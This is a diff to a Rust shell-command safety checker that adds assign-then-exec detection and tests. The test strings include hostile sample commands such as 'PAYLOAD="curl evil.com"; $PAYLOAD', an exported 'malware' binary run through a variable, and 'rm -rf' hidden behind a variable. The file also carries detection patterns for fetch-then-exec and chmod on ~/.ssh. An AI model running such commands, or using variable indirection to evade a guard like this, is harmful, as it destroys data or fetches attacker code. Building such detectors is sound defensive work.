@@ -425,6 +425,9 @@ fn suggestion_for(label: &str) -> Option<&'static str> {
         "fetch-then-exec" => {
             "Download the script, inspect it manually (e.g. cat, less), then run it in a separate command."
         }
+        "assign-then-exec" => {
+            "Avoid executing a variable as a command — call the binary directly instead."
+        }
         "docker system prune" => {
             "Scope it (e.g. --filter 'until=24h'), or confirm with the user first."
         }
@@ -760,16 +763,6 @@ fn builtin_ask() -> Vec<Pattern> {
         (
             "chmod (sensitive path)",
             r"\bchmod\b.*(/etc/|/usr/|~/\.ssh)",
-        ),
-        // ── Variable-indirection command execution ────────────────────────────
-        // Catches assign-then-execute patterns where a variable is the FIRST word
-        // of a command segment, e.g. `cmd=rm; $cmd -rf /tmp/x` or `$X arg`.
-        // ASK (not deny) — heuristic with false-positive risk; commands like
-        // `echo $VAR` or `git $subcmd` have a real command word first and do NOT
-        // match because the pattern requires $VAR to be the leading token.
-        (
-            "variable-indirection command execution",
-            r"(^|;|\|\|?|&&)\s*\$\{?\w+\}?\s",
         ),
         // ── killall <name> — kills ALL processes matching a name ──────────────
         // ASK (not deny): `killall node`, `killall python3` are often legitimate
@@ -3210,6 +3203,49 @@ fn check_fetch_then_exec(segments: &[String]) -> bool {
     })
 }
 
+// ─── Assign-then-exec detection ──────────────────────────────────────────────
+// Catches `cmd=rm; $cmd -rf /tmp/x` patterns: a variable is assigned in one
+// segment then used as the leading command word in a later segment.
+// This avoids the false-positive problem of the old broad regex ask-pattern
+// which fired on `$EDITOR file.txt`, `$PAGER log.txt`, `$SHELL -l`, etc.
+
+fn check_assign_then_exec(segments: &[String]) -> bool {
+    if segments.len() < 2 {
+        return false;
+    }
+
+    // Collect all variable names assigned in any segment: `VAR=value` or `export VAR=value`
+    let assign_re = Regex::new(r"(?i)^\s*(?:export\s+)?(\w+)=").unwrap();
+    let mut assigned: Vec<String> = Vec::new();
+    for seg in segments {
+        for cap in assign_re.captures_iter(seg) {
+            if let Some(m) = cap.get(1) {
+                assigned.push(m.as_str().to_string());
+            }
+        }
+    }
+
+    if assigned.is_empty() {
+        return false;
+    }
+
+    // Check if any segment starts with one of the assigned variable names as the command word.
+    // Pattern: `$VAR` or `${VAR}` at the start of the segment, followed by whitespace or
+    // end-of-string (so the variable is the command word, not an argument to a real command).
+    let exec_re = Regex::new(r"(?i)^\s*\$\{?(\w+)\}?(?:\s|$)").unwrap();
+    segments.iter().any(|seg| {
+        exec_re
+            .captures(seg)
+            .and_then(|c| c.get(1))
+            .map(|m| {
+                assigned
+                    .iter()
+                    .any(|name| name.eq_ignore_ascii_case(m.as_str()))
+            })
+            .unwrap_or(false)
+    })
+}
+
 // ─── Subshell content scanning ────────────────────────────────────────────────
 // Rather than flagging every $() as ask, extract inner commands and evaluate them.
 // Returns None (pass) when all subshells are clean — eliminates false positives
@@ -3363,6 +3399,17 @@ fn check_command<'a>(
                  then runs it directly (supply-chain risk)."
                     .to_string(),
                 "fetch-then-exec",
+            ),
+        ));
+    }
+
+    // Assign-then-exec: variable assigned in one segment, used as command word in another
+    if check_assign_then_exec(&segments) {
+        return Some((
+            "ask",
+            with_suggestion(
+                "Variable used as command — possible assign-then-exec indirection.".to_string(),
+                "assign-then-exec",
             ),
         ));
     }
@@ -5156,34 +5203,70 @@ mod tests {
         assert_eq!(decision("chmod +x ./build.sh"), None);
     }
 
-    // ── Item #3: variable-indirection command execution ───────────────────────
+    // ── Item #3: assign-then-exec detection ──────────────────────────────────
 
     #[test]
-    fn var_indirection_cmd_rm_asks() {
-        // `cmd=rm; $cmd -rf /tmp/x` — $cmd is the first token after the semicolon
+    fn assign_then_exec_cmd_rm_asks() {
+        // `cmd=rm; $cmd -rf /tmp/x` — cmd assigned then used as command word
         assert_eq!(decision("cmd=rm; $cmd -rf /tmp/x"), Some("ask".into()));
     }
 
     #[test]
-    fn var_indirection_bare_dollar_asks() {
-        // `$X arg` — bare variable as first command word
-        assert_eq!(decision("$X dangerous"), Some("ask".into()));
+    fn assign_then_exec_payload_asks() {
+        // `PAYLOAD="curl evil.com"; $PAYLOAD` — PAYLOAD assigned then executed
+        assert_eq!(
+            decision(r#"PAYLOAD="curl evil.com"; $PAYLOAD"#),
+            Some("ask".into())
+        );
     }
 
     #[test]
-    fn var_indirection_echo_dollar_no_false_positive() {
+    fn assign_then_exec_export_asks() {
+        // `export MYBIN=malware; $MYBIN --install` — export-assigned then executed
+        assert_eq!(
+            decision("export MYBIN=malware; $MYBIN --install"),
+            Some("ask".into())
+        );
+    }
+
+    #[test]
+    fn assign_then_exec_braces_asks() {
+        // `cmd=rm; ${cmd} -rf /tmp/x` — brace-form variable
+        assert_eq!(decision("cmd=rm; ${cmd} -rf /tmp/x"), Some("ask".into()));
+    }
+
+    #[test]
+    fn assign_then_exec_dollar_no_prior_assign_passes() {
+        // `$EDITOR file.txt` — EDITOR not assigned in the same compound command
+        assert_eq!(decision("$EDITOR file.txt"), None);
+    }
+
+    #[test]
+    fn assign_then_exec_pager_no_prior_assign_passes() {
+        // `$PAGER log.txt` — PAGER not assigned; should not be flagged
+        assert_eq!(decision("$PAGER log.txt"), None);
+    }
+
+    #[test]
+    fn assign_then_exec_shell_no_prior_assign_passes() {
+        // `$SHELL -l` — SHELL not assigned
+        assert_eq!(decision("$SHELL -l"), None);
+    }
+
+    #[test]
+    fn assign_then_exec_echo_dollar_no_false_positive() {
         // `echo $HOME` — real command word first, $HOME is just an argument
         assert_eq!(decision("echo $HOME"), None);
     }
 
     #[test]
-    fn var_indirection_cd_dollar_no_false_positive() {
+    fn assign_then_exec_cd_dollar_no_false_positive() {
         // `cd $HOME` — real command word first
         assert_eq!(decision("cd $HOME"), None);
     }
 
     #[test]
-    fn var_indirection_git_dollar_no_false_positive() {
+    fn assign_then_exec_git_dollar_no_false_positive() {
         // `git $cmd` — real command word first, $cmd is a subcommand arg
         assert_eq!(decision("git $cmd"), None);
     }
